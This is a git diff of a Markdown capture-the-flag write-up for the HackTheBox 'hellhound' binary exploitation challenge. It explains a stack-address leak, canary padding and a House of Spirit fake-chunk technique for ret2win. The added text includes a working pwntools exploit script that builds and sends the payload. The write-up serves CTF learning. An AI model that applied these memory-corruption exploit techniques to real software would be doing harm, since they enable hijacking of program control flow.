@@ -14,7 +14,7 @@ hellhound: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
 
 > BINARY PROTECTIONS
 
-```console
+```
 ┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_hellhound/challenge]
 └─$ pwn checksec hellhound
 [*] '/home/brandy/Downloads/pwn_hellhound/challenge/hellhound'
@@ -32,13 +32,9 @@ hellhound: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/837cfbd1-7a56-4833-86e7-1818c1462500)
 
 
-4. Although there's no potential overflow, we still can do ret2win here. The heap exploit we're gonna do is called **House of Spirit**.
+4. Although there's no potential overflow, we still can do ret2win here.
 
 ### FLOW
-
-```
-We're gonna do a fake chunk then overwrites a pointer to point to it.
-```
 
 First we need to grab the leaked stack address at option 1, then we add it with our padding. 
 
@@ -51,21 +47,83 @@ First we need to grab the leaked stack address at option 1, then we add it with 
 choice (8 bytes) + canary (8 bytes) + input (64 bytes).
 ```
 
-Why do we need canary?? No need to explain this in detail I guess, already learned heap, I'm guessing you already familiar with canary.
+```
+Why do we need canary?? No need to explain this in detail I guess, already learned heap,
+I'm guessing you already familiar with canary.
 So our return address is consist of --> leaked stack address + padding.
-
-Anyway we still have a problem, after freeing our input, the program terminates itself (goes to return 0). Well, we don't want that.
-
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cac7c853-2954-4c4c-b713-621e8540e280)
-
-
-This is where **House of Spirit** come in play, we need to make a fake chunk, the fake chunk can't be like our casual junk (8 bytes A or whatever).
-It must be a NULL (0) or actual chunk.
-
-So what we want to send in 3rd option is:
-
-```
-0x0 (fake chunk) + return_address (leaked stack address + padding).
 ```
 
-Then
+Why do we need to add 8 bytes?? It's for padding. Notice if we use option 3, 8 bytes shall moved, hence we need another padding for that.
+
+So what we want to send in 2nd option is:
+
+```
+another_padding (8 bytes) + return_address (leaked stack address + padding).
+```
+
+Then go to the 3rd option to move 8 bytes.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4fb585bd-92b1-49cf-a957-a9d963db5111)
+
+
+Hence it shall prompted a menu again to us (returned to the stack).
+
+5. Here's the script so far:
+
+> TEMP SCRIPT
+
+```py
+from pwn import *
+import os 
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './hellhound'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = start()
+sh.sendlineafter(b'>', b'1')
+sh.recvuntil(b': [')
+get = sh.recvline().strip()
+leaked = get[:15]
+leaked = int(leaked)
+log.success(f'LEAKED STACK ADDRESS --> {hex(leaked)}')
+
+rip = 80 # 64 (malloc) + canary + choice
+ret_addr = leaked + rip
+log.info(f'RET ADDRESS --> {hex(ret_addr)}')
+
+sh.sendlineafter(b'>', b'2')
+# payload so we got back
+p = flat([
+    asm('nop') * 8, 
+    ret_addr
+])
+sh.sendlineafter(b':', p)
+sh.sendlineafter(b'>', b'3') # moves chunk pointer 8 bytes, now chunk points to return address.
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4c4fc836-0607-4e60-85f6-4824987af3d0)
+
+
+#### NOTES:
+
+```
+We got one more problem, after freeing our input using option 69, it returned to 0, with this the program shall terminated.
+We don't want that, we can use fake chunk.
+
+The fake chunk can only be 0 (NULL) or the actual chunk. Hence the heap concept here is House of Spirit + heap_ret2win.
+```
+
+6. Great! Now the last payload we need to send is the berserk_mode_off() address + fake chunk.
+
